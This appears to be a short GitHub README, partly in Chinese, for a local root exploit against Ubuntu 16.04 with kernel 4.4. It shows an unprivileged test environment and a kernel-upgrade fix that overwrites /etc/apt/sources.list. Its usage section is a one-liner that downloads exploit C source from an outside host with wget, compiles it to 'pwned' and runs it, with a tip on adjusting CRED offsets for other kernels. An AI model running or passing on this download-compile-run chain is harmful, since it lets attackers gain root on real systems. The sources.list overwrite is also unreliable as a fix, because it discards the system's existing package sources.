# Ubuntu16.04-0day

#### all 4.4 ubuntu aws instances are vulnerable

### 漏洞测试环境
```
➜  ~ id

uid=1002(test) gid=1002(test) groups=1002(test)

➜  ~ lsb_release -a                  

Distributor ID:	Ubuntu
Description:	Ubuntu 16.04.3 LTS
Release:	16.04
Codename:	xenial

➜  ~ uname -a

Linux ubuntu 4.4.0-87-generic #110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux

➜  ~ 

```
### 参考解决方案
```

echo "deb http://archive.ubuntu.com/ubuntu/  xenial-proposed restricted main multiverse universe" > /etc/apt/sources.list

apt update 

apt install linux-image-4.4.0-117-generic

reboot

```

[![asciicast](https://asciinema.org/a/7OBFovzR6b5g5FQsS3bUVe0aW.png)](https://asciinema.org/a/7OBFovzR6b5g5FQsS3bUVe0aW)


## Use-Age:

```

wget -P /tmp http://cyseclabs.com/exploits/upstream44.c &&cd /tmp && gcc -o pwned  upstream44.c && chmod 777 pwned && ./pwned 


```

![](./0day.jpg)
#### 注意 如果不同的内核调整CRED偏移量+检查内核堆栈大小



### 参考链接

https://twitter.com/vnik5287/status/974439706896187392

http://cyseclabs.com/exploits/upstream44.c

![](./1.jpg)
